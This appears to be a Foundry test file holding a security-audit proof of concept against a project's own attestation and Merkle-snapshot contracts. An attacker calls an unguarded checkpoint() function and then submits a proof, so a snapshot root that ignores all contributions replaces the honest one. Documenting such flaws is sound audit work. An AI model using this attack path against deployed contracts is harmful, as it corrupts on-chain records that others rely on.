// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";

import {EAS} from "@ethereum-attestation-service/eas-contracts/contracts/EAS.sol";
import {SchemaRegistry} from "@ethereum-attestation-service/eas-contracts/contracts/SchemaRegistry.sol";
import {
    IEAS,
    AttestationRequest,
    AttestationRequestData
} from "@ethereum-attestation-service/eas-contracts/contracts/IEAS.sol";
import {ISchemaRegistry} from "@ethereum-attestation-service/eas-contracts/contracts/ISchemaRegistry.sol";
import {NO_EXPIRATION_TIME, EMPTY_UID} from "@ethereum-attestation-service/eas-contracts/contracts/Common.sol";

import {EASIndexerResolver} from "contracts/eas/resolvers/EASIndexerResolver.sol";
import {ContributionResolver} from "contracts/eas/resolvers/ContributionResolver.sol";
import {TrustAccumulatorMirror} from "contracts/merkle/TrustAccumulatorMirror.sol";
import {MerkleSnapshot} from "contracts/merkle/MerkleSnapshot.sol";
import {IMerkleSnapshot} from "interfaces/merkle/IMerkleSnapshot.sol";
import {IAttestationAccumulator} from "interfaces/merkle/IAttestationAccumulator.sol";
import {IAnchorRegistry} from "interfaces/registry/IAnchorRegistry.sol";
import {MockZkVerifier} from "../mocks/MockZkVerifier.sol";

/// @title AuditM6Poc
/// @notice Adversarial PoCs for the M6 contributions surface. See docs/contributions/AUDIT_M6.md.
contract AuditM6Poc is Test {
    string constant CLAIM_SCHEMA = "string title,bytes32 contentHash,string uri,address[] contributors,uint32[] shares";
    string constant RESPONSE_SCHEMA = "bytes32 claimUID,uint8 response";
    string constant VALUATION_SCHEMA = "bytes32 claimUID,uint8 score";

    SchemaRegistry schemaRegistry;
    EAS eas;
    EASIndexerResolver trustResolver;
    TrustAccumulatorMirror mirror;
    ContributionResolver contribResolver;
    bytes32 claimUid;
    bytes32 responseUid;
    bytes32 valuationUid;
    MockZkVerifier verifier;
    MerkleSnapshot snapshot;

    bytes32 constant PARAMS_HASH = keccak256("contributions-params-dev");
    uint64 constant EPOCH_LENGTH = 10;

    address attacker = address(0xBAD);
    address bob = address(0xB0B);

    bytes32 constant HONEST_ROOT = bytes32(uint256(0xC0FFEE));
    bytes32 constant BLIND_ROOT = bytes32(uint256(0xDEAD));

    function setUp() public {
        schemaRegistry = new SchemaRegistry();
        eas = new EAS(ISchemaRegistry(address(schemaRegistry)));

        trustResolver = new EASIndexerResolver(IEAS(address(eas)));
        schemaRegistry.register("string comment,uint256 confidence", trustResolver, true);

        contribResolver = new ContributionResolver(IEAS(address(eas)), address(this));
        claimUid = schemaRegistry.register(CLAIM_SCHEMA, contribResolver, true);
        responseUid = schemaRegistry.register(RESPONSE_SCHEMA, contribResolver, true);
        valuationUid = schemaRegistry.register(VALUATION_SCHEMA, contribResolver, true);
        contribResolver.setSchemas(claimUid, responseUid, valuationUid);

        mirror = new TrustAccumulatorMirror(IAttestationAccumulator(address(trustResolver)));
        verifier = new MockZkVerifier();
        snapshot = new MerkleSnapshot(
            verifier, PARAMS_HASH, IAttestationAccumulator(address(mirror)), address(this), address(this)
        );
        snapshot.setAnchorRegistry(IAnchorRegistry(address(contribResolver)));
        snapshot.setEpochLength(EPOCH_LENGTH);
        vm.roll(100);
    }

    /// @dev Fold N contribution-claim leaves into the contribResolver (lane 2).
    function _foldContribution(bytes memory data) internal {
        eas.attest(
            AttestationRequest({
                schema: claimUid,
                data: AttestationRequestData({
                    recipient: bob,
                    expirationTime: NO_EXPIRATION_TIME,
                    revocable: true,
                    refUID: EMPTY_UID,
                    data: data,
                    value: 0
                })
            })
        );
    }

    /// @notice HIGH: a directly-created mirror checkpoint (no NoNewInputs guard) mints a lane-1
    ///         checkpoint id whose paired lane-2 anchor in MerkleSnapshot is (0,0) — because only
    ///         trigger() populates anchorCheckpoints. A prover can submitProof against that id,
    ///         binding lane-2 (the contribution log) to EMPTY even though the live log is non-empty.
    function test_poc_mirrorSpamCheckpoint_desyncsLane2() public {
        // A real, non-empty contribution log exists.
        _foldContribution(hex"1111");
        _foldContribution(hex"2222");
        assertEq(contribResolver.anchorCount(), 2, "precondition: 2 contributions folded");

        // Honest epoch: trigger() freezes BOTH lanes at the same block.
        uint256 honestId = snapshot.trigger();
        (bytes32 hAnchorAcc, uint64 hAnchorCount) = snapshot.anchorCheckpoints(honestId);
        assertEq(hAnchorCount, 2, "honest trigger binds the real contribution count");
        assertTrue(hAnchorAcc != bytes32(0), "honest trigger binds the real contribution acc");
        snapshot.submitProof(honestId, HONEST_ROOT, bytes32(uint256(1)), "cid-honest", 1000, bytes32(0), hex"");

        // More contributions arrive; the live log now has 3 leaves.
        _foldContribution(hex"3333");
        assertEq(contribResolver.anchorCount(), 3, "live contribution log is non-empty (3 leaves)");

        // ATTACK: anyone calls the mirror's checkpoint() DIRECTLY. No epoch gate, no NoNewInputs
        // guard, no auth. This mints lane-1 checkpoint id = 1 that trigger() never paired.
        vm.prank(attacker);
        uint256 spamId = mirror.checkpoint();
        assertEq(spamId, honestId + 1, "attacker minted the next lane-1 checkpoint id");

        // The paired lane-2 anchor for the spam id is the DEFAULT (0,0): trigger() never ran for it.
        (bytes32 sAnchorAcc, uint64 sAnchorCount) = snapshot.anchorCheckpoints(spamId);
        assertEq(sAnchorAcc, bytes32(0), "DESYNC: spam checkpoint's lane-2 acc is zero");
        assertEq(sAnchorCount, 0, "DESYNC: spam checkpoint's lane-2 count is zero (log has 3!)");

        // A prover feeds the guest an EMPTY lane 2 (a valid guest execution: empty input commits
        // (0,0)), producing a contributions-BLIND root. On-chain it matches anchorCheckpoints[spamId]
        // = (0,0), so the proof verifies and the blind snapshot is applied over the honest one.
        vm.prank(attacker);
        snapshot.submitProof(spamId, BLIND_ROOT, bytes32(uint256(2)), "cid-blind", 500, bytes32(0), hex"");

        assertEq(snapshot.lastAppliedCheckpoint(), spamId, "blind checkpoint became the applied one");
        assertEq(snapshot.getLatestState().root, BLIND_ROOT, "latest snapshot root ignores all contributions");
    }
}
